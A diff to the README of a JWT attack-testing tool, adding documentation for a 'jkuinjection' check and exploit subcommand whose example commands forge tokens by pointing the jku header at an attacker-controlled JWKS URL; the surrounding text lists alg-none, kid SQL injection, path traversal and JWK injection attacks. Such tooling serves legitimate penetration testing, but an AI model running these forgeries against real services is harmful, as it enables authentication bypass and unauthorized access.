@@ -269,6 +269,7 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `--delay` | Delay between probe requests to the target URL, e.g. `200ms` (default: no delay) |
 | `--kid-sql-table` | Table name for the kid SQL injection payload (default `tokens`) |
 | `--kid-path` | File path for the kid path traversal payload (default `/dev/null`) |
+| `--jku-server-addr` | Bind address for a local JWKS server used by the `jkuinjection` check, e.g. `0.0.0.0:8089` (must be reachable by the target; check is skipped if unset) |
 | `--token-in` | Where to place the exploited JWT: `header`, `cookie`, `query`, or `body` (default `header`) |
 | `--token-name` | Header/cookie/query/form-field name for the JWT (default `Authorization` for header, `token` otherwise) |
 | `--token-prefix` | Value prefix before the token, e.g. `Bearer ` (default `Bearer ` only for the default Authorization header) |
@@ -289,7 +290,7 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `nullsig` | Token has an empty signature segment |
 | `weaksecret` | Cracks the HMAC signing secret via dictionary attack |
 
-**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114).
+**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114), `jkuinjection` (RSA/ECDSA-only, requires `--jku-server-addr`).
 
 > Command and LDAP kid injection (`jwtop exploit kidinjection --mode command|ldap`) are exploit-only for now — the `crack` server probe does not yet include these two techniques.
 
@@ -372,6 +373,7 @@ jwtop exploit <subcommand> <token> [flags]
 | `weaksecret` | Dictionary-attack the HMAC signing secret |
 | `kidinjection` | Manipulate the `kid` header field and re-sign |
 | `jwkinjection` | Embed a self-signed JWK in the header and re-sign (CVE-2018-0114) |
+| `jkuinjection` | Point `jku` at an attacker-controlled JWKS URL and re-sign |
 
 **algnone**
 
@@ -464,6 +466,20 @@ jwtop exploit jwkinjection $TOKEN --key /path/to/private.pem  # re-sign with an 
 |------|-------------|
 | `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
 | `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+
+**jkuinjection** — generates a self-signed RSA/ECDSA key pair, points the token's `jku` header at `--url`, and re-signs with the matching private key. `--url` must serve a JWKS document containing the matching public key — this command only sets the header and signs; it does not host the JWKS itself. Servers that fetch `jku` and trust its contents without validating the URL against an allowlist accept the forged token. To have jwtop also host the JWKS during a live probe, use `jwtop crack --jku-server-addr` instead.
+
+```sh
+jwtop exploit jkuinjection $TOKEN --url https://attacker.example/.well-known/jwks.json                            # generates an RS256 key pair
+jwtop exploit jkuinjection $TOKEN --alg ES256 --url https://attacker.example/.well-known/jwks.json                # generates an ES256 key pair
+jwtop exploit jkuinjection $TOKEN --key /path/to/private.pem --url https://attacker.example/.well-known/jwks.json # re-sign with an existing key instead
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
+| `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+| `--url` | Attacker-controlled URL serving a JWKS with the matching public key (required) |
 
 ---
 
